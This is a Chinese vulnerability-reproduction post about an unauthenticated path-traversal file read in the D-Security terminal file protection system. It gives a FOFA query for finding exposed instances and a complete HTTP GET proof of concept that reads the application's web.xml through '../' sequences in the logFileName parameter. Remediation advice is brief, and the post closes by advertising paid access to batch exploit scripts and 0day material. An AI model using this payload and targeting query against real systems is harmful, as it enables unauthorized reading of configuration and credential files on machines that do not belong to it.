#  「漏洞复现」以柔资讯-D-Security终端文件保护系统 logFileName 任意文件读取漏洞   
冷漠安全  冷漠安全   2025-01-08 10:55  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
D-Security终端文件保护系统是一套专注于企业文件管理效率与安全的解决方案，统对文件进行全文加密，而非仅在文件表头或特定部分进行加密，从而大大提高了文件的安全性，降低了被破解的风险。D-Security终端文件保护系统是被政府和国安局等情报单位唯一认定的安全文件加密产品。它不仅能够实现内容加密和文件保护，确保企业敏感文件的安全，还遵循商业秘密法的规范，能够完整记录用户存取和交换文件的轨迹，提供文件存取溯源记录。这使得企业能够建立起信息安全治理的改善循环。  
  
0x03  
  
漏洞威胁  
  
以柔资讯-D-Security终端文件保护系统 logFileName 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
title="D-Security" || title="WNJsoft" || title="W&Jsoft"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p6IXzbmkcowruvlvickpdIia8YnfAmPbcPYo2uHZGYfev6C6ydhBp9Hz7Ffw2RE4gI58DqN187XsNA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p6IXzbmkcowruvlvickpdIiaVv2X1GY1ukJfqByVC7y9ia52LeQnCeOvxZFZfuo5r3TUFZdYFGQuWpA/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p6IXzbmkcowruvlvickpdIiaYmjMrcwg4vBfSb3UibM3rXWhlicibt5utba8TGC5AIicFITyRlHd9GpibnA/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p6IXzbmkcowruvlvickpdIiak3b6AZ52JcYquvFccibBfwEUZXic8L6azW6icibHlkfsvec02BYxib4LeDw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0p6IXzbmkcowruvlvickpdIiaAkboAJLSTqW54J53Fcjz88bur5qrbx6rpeHqgVyg65ERMC0O5iazWsg/640?wx_fmt=gif&from=appmsg "")  
  
  
